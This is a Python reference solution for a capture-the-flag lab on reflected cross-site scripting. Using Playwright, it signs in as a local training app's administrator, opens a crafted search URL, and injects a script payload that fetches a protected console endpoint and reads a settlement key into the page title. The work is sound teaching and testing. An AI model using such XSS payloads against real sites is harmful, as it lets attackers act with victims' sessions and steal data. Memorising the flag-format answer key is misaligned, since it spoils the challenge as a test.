#!/usr/bin/env python3
"""
Reference solution for challenge 03: reflected cross-site scripting.

The settlement console answers only script-initiated requests carrying an
administrator session, so the flag cannot be fetched from a terminal. Reading
it requires that script actually ran inside a browser holding that session,
which is precisely the capability XSS grants an attacker.

The demonstration therefore signs in as the administrator, opens a crafted
search URL, and lets the injected script call the console on the
administrator's behalf. That is the realistic shape of the attack: the
attacker never holds the administrator's session and never sends a request to
the console themselves.
"""

import json
import os
import sys
import urllib.parse
from pathlib import Path

from playwright.sync_api import sync_playwright

BASE = os.environ.get("BASE", "http://127.0.0.1:8803")

# The payload runs in the administrator's browser and calls the console the way
# the page's own front end would.
PAYLOAD = (
    "<script>"
    "fetch('/console',{headers:{'X-Requested-With':'XMLHttpRequest'}})"
    ".then(r=>r.json())"
    ".then(d=>{document.title=d.settlement_key||'no-key-returned'})"
    "</script>"
)


def step(number: str, text: str) -> None:
    print(f"\n== {number}. {text} ==")


def main() -> int:
    print("== 0. the console refuses a direct request from a terminal ==")
    # Reproduced with a plain HTTP call carrying no browser context. The
    # endpoint is same-origin and script-only by design.
    import urllib.request

    request = urllib.request.Request(
        f"{BASE}/console",
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    try:
        urllib.request.urlopen(request)
        print("   unexpected: the console answered a terminal request")
    except urllib.error.HTTPError as error:
        print(f"   HTTP {error.code} {json.loads(error.read()).get('error')}")

    url = f"{BASE}/search?q={urllib.parse.quote(PAYLOAD)}"

    with sync_playwright() as playwright:
        browser = playwright.firefox.launch(headless=True)
        context = browser.new_context()

        step("1", "sign in as the administrator (the victim of the crafted link)")
        # The login is performed through the context's request client, which
        # shares its cookie jar with the browser. Driving the form by clicking
        # is left to the audience during the talk; here the session is
        # established directly so the demonstration is reproducible.
        response = context.request.post(
            f"{BASE}/login",
            form={"username": "administrator", "password": "admin"},
        )
        if not response.ok:
            print(f"   login failed: HTTP {response.status}")
            return 1
        cookies = [c for c in context.cookies() if c["name"] == "session"]
        if not cookies:
            print("   no session cookie was issued")
            return 1
        print(f"   session cookie issued for {cookies[0]['value'][:24]}...")

        page = context.new_page()

        step("2", "open the crafted search URL the administrator was sent")
        console_output: list[str] = []
        page.on("console", lambda message: console_output.append(message.text))
        page.goto(url)
        page.wait_for_function("document.title !== 'Search — Northwind Supply Co.'",
                               timeout=10_000)
        print(f"   document.title after injection: {page.title()!r}")
        if console_output:
            print(f"   browser console: {console_output}")

        step("3", "the script has already read the settlement key")
        found = page.title()
        page.screenshot(path=Path(__file__).with_name("xss-proof.png"), full_page=True)
        print(f"   screenshot written to solution/xss-proof.png")

        browser.close()

    if found.startswith("G24{"):
        print(f"\n   {found}")
        return 0
    print(f"\n   no flag in the document title (got {found!r})")
    return 1


if __name__ == "__main__":
    sys.exit(main())